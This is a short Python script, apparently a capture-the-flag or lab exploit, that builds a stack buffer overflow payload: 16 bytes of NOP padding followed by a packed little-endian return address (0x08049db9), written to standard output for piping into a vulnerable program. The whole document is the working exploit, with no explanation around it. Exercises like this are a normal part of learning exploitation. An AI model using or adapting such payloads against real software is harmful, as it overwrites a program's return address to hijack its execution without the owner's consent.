from struct import pack
import sys

buffer_size = 16

address = pack("<I", 0x08049db9)

payload = (b'\x90' * buffer_size) + address

sys.stdout.buffer.write(payload)

